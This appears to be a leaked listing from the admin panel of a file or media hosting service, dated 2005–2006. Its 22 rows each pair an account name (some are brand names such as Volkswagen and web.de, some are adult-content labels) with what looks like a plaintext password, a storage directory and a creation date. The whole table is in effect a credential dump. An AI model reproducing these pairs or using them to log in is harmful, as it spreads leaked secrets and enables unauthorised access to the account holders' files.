+webde	web4U	files/mobile/web.de/	No		March 14th 2006	Delete
+Volkswagen	Eos4ME	files/mobile/Volkswagen/	No		December 12th 2005	Delete
+Mangababes	AndyMuE	files/mobile/Mangababes/	No		April 18th 2006	Delete
+neckermann	mobile	files/mobile/neckermann/	No		March 9th 2006	Delete
+bite	WbiteU	files/mobile/bite/	No		March 20th 2006	Delete
+cellular	videos	files/mobile/cellular/	No		December 13th 2005	Delete
+test	test	files/mobile/test/	No		May 3rd 2006	Delete
+beckmann	sales	files/mobile/beckmann/	No		February 1st 2006	Delete
+Pleasure	Content4U	files/mobile/Pleasure/	No		June 1st 2006	Delete
+planbNY2	NewYork	files/mobile/planbNY2/	No	plan_b New York	May 31st 2006	Delete
+planbNY3	NewYork	files/mobile/planbNY3/	No	plan_b New York	June 1st 2006	Delete
+exchange	gimme	files/tv/Exchange_RK/	No		May 15th 2006	Delete
+Eurocreme	Gays	files/mobile/eurocreme/	No		March 3rd 2006	Delete
+Userfsk18	Videofsk18	files/mobile/gayvideos/	No		January 19th 2006	Delete
+Stefan	comein	files/mobile/Stefan/	No		April 28th 2006	Delete
+becks	MMgold	files/interactive/Carlo/	No		January 30th 2006	Delete
+X-Man	beast	files/mobile/X-Man/	No		January 23rd 2006	Delete
+PTC	4PTCpl	files/mobile/PTC/	No		April 20th 2006	Delete
+andre	planb	files/mobile/andre/	No		May 30th 2006	Delete
+MMNY	usa	files/mobile/MMNY/	No		May 31st 2006	Delete
+MMukUS	4MMukUS	files/mobile/MMukUS/	No		April 20th 2006	Delete
+mediacom	professordr	files/mobile/mediacom/	No		April 20th 2006	Delete
